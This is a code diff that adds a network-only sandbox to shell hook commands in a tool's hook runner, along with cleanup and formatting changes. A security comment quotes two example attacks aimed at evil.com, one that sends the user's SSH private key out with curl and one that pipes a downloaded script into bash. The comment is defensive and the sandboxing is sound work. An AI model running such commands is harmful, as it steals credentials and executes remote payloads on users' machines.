@@ -128,6 +128,7 @@ import {
   permissionRuleValueFromString,
 } from './permissions/permissionRuleParser.js'
 import { logError } from './log.js'
+import { SandboxManager } from './sandbox/sandbox-adapter.js'
 import { createCombinedAbortSignal } from './combinedAbortSignal.js'
 import type { PermissionResult } from './permissions/PermissionResult.js'
 import { registerPendingAsyncHook } from './hooks/AsyncHookRegistry.js'
@@ -1036,6 +1037,57 @@ async function execCommandHook(
   // without Git Bash — but init.ts still calls setShellIfWindows() on
   // startup, which will exit first. Relaxing that is phase 1 of the
   // design's implementation order (separate PR).
+
+  // SECURITY: Apply network-only sandbox to hook commands when sandboxing is enabled.
+  // Hooks execute arbitrary shell commands from settings.json without going
+  // through the Bash tool's permission prompt. Unlike the full Bash sandbox,
+  // hooks only get network restrictions (not filesystem restrictions) because:
+  //   - Legitimate hooks (formatters, linters, type checkers) need full
+  //     filesystem access to read/write project files
+  //   - The core threat from malicious hooks is data exfiltration (e.g.
+  //     `curl http://evil.com?key=$(cat ~/.ssh/id_rsa)`) and payload download
+  //     (e.g. `wget http://evil.com/malware.sh | bash`)
+  //   - Hooks that genuinely need network (notifications) should use the
+  //     `http` hook type, which is not affected by this sandbox
+  let sandboxedCommand = finalCommand
+  if (!isPowerShell && SandboxManager.isSandboxingEnabled()) {
+    try {
+      sandboxedCommand = await SandboxManager.wrapWithSandbox(
+        finalCommand,
+        undefined, // use default shell
+        {
+          // Network: deny all outbound by default. Hooks that need network
+          // should use the `http` hook type instead of shell commands.
+          network: {
+            allowedDomains: [],
+            deniedDomains: [],
+          },
+          // Filesystem: no additional restrictions beyond sandbox defaults.
+          // Hooks need to read/write project files freely (e.g. prettier --write).
+          filesystem: {
+            allowWrite: ['/'],
+            denyWrite: [],
+            allowRead: [],
+            denyRead: [],
+          },
+        },
+        signal,
+      )
+      logForDebugging(
+        `Hook command sandboxed (network-only): ${hook.command}`,
+        { level: 'verbose' },
+      )
+    } catch (sandboxError) {
+      // If sandbox wrapping fails, log and continue without sandbox.
+      // This preserves backwards compatibility — hooks that ran before
+      // sandbox support was added will still work.
+      logForDebugging(
+        `Failed to sandbox hook command, running unsandboxed: ${errorMessage(sandboxError)}`,
+        { level: 'warn' },
+      )
+    }
+  }
+
   let child: ChildProcessWithoutNullStreams
   if (shellType === 'powershell') {
     const pwshPath = await getCachedPowerShellPath()
@@ -1056,7 +1108,7 @@ async function execCommandHook(
     // On Windows, use Git Bash explicitly (cmd.exe can't run bash syntax).
     // On other platforms, shell: true uses /bin/sh.
     const shell = isWindows ? findGitBashPath() : true
-    child = spawn(finalCommand, [], {
+    child = spawn(sandboxedCommand, [], {
       env: envVars,
       cwd: safeCwd,
       shell,
@@ -1183,7 +1235,6 @@ async function execCommandHook(
                 child.stdin.destroy()
               }
             })
-            continue
           }
         } catch {
           // Not JSON, just a normal line
@@ -1413,6 +1464,10 @@ async function execCommandHook(
     if (!shellCommandTransferred) {
       shellCommand.cleanup()
     }
+    // Clean up sandbox artifacts (e.g. bwrap mount-point files on Linux)
+    if (sandboxedCommand !== finalCommand) {
+      SandboxManager.cleanupAfterCommand()
+    }
   }
 }
 
@@ -1559,7 +1614,6 @@ function getPluginHookCounts(
   return counts
 }
 
-
 /**
  * Build a map of {hookType: count} from matched hooks.
  */
@@ -1694,7 +1748,7 @@ export async function getMatchingHooks(
 
     // If you change the criteria below, then you must change
     // src/utils/hooks/hooksConfigManager.ts as well.
-    let matchQuery: string | undefined = undefined
+    let matchQuery: string | undefined
     switch (hookInput.hook_event_name) {
       case 'PreToolUse':
       case 'PostToolUse':
@@ -2321,7 +2375,7 @@ async function* executeHooks({
         )
         // Inject timing fields for hook visibility
         if (promptResult.message?.type === 'attachment') {
-          const att = promptResult.message.attachment
+          const att = promptResult.message.attachment!
           if (
             att.type === 'hook_success' ||
             att.type === 'hook_non_blocking_error'
@@ -2361,7 +2415,7 @@ async function* executeHooks({
         )
         // Inject timing fields for hook visibility
         if (agentResult.message?.type === 'attachment') {
-          const att = agentResult.message.attachment
+          const att = agentResult.message.attachment!
           if (
             att.type === 'hook_success' ||
             att.type === 'hook_non_blocking_error'
@@ -3334,7 +3388,8 @@ async function executeHooksOutsideREPL({
             hookEvent === 'WorktreeCreate'
               ? httpJson &&
                 isSyncHookJSONOutput(httpJson) &&
-                typedHttpJson?.hookSpecificOutput?.hookEventName === 'WorktreeCreate'
+                typedHttpJson?.hookSpecificOutput?.hookEventName ===
+                  'WorktreeCreate'
                 ? typedHttpJson.hookSpecificOutput.worktreePath
                 : ''
               : httpResult.body
@@ -3428,11 +3483,14 @@ async function executeHooksOutsideREPL({
           isSyncHookJSONOutput(json) &&
           typedJson?.hookSpecificOutput &&
           'watchPaths' in typedJson.hookSpecificOutput
-            ? (typedJson.hookSpecificOutput as { watchPaths?: string[] }).watchPaths
+            ? (typedJson.hookSpecificOutput as { watchPaths?: string[] })
+                .watchPaths
             : undefined
 
         const systemMessage =
-          json && isSyncHookJSONOutput(json) ? typedJson?.systemMessage : undefined
+          json && isSyncHookJSONOutput(json)
+            ? typedJson?.systemMessage
+            : undefined
 
         return {
           command: hook.command,
@@ -3692,7 +3750,10 @@ export async function executeStopFailureHooks(
   const rawContent = lastMessage.message?.content
   const lastAssistantText =
     (Array.isArray(rawContent)
-      ? extractTextContent(rawContent as readonly { readonly type: string }[], '\n').trim()
+      ? extractTextContent(
+          rawContent as readonly { readonly type: string }[],
+          '\n',
+        ).trim()
       : typeof rawContent === 'string'
         ? rawContent.trim()
         : '') || undefined
@@ -3756,7 +3817,10 @@ export async function* executeStopHooks(
   const lastAssistantContent = lastAssistantMessage?.message?.content
   const lastAssistantText = lastAssistantMessage
     ? (Array.isArray(lastAssistantContent)
-        ? extractTextContent(lastAssistantContent as readonly { readonly type: string }[], '\n').trim()
+        ? extractTextContent(
+            lastAssistantContent as readonly { readonly type: string }[],
+            '\n',
+          ).trim()
         : typeof lastAssistantContent === 'string'
           ? lastAssistantContent.trim()
           : '') || undefined
@@ -4538,10 +4602,15 @@ function parseElicitationHookOutput(
       return {}
     }
 
-    const typedSpecific = specific as { action: string; content?: Record<string, unknown> }
+    const typedSpecific = specific as {
+      action: string
+      content?: Record<string, unknown>
+    }
     const response: ElicitationResponse = {
       action: typedSpecific.action as ElicitationResponse['action'],
-      content: typedSpecific.content as ElicitationResponse['content'] | undefined,
+      content: typedSpecific.content as
+        | ElicitationResponse['content']
+        | undefined,
     }
 
     const out: {
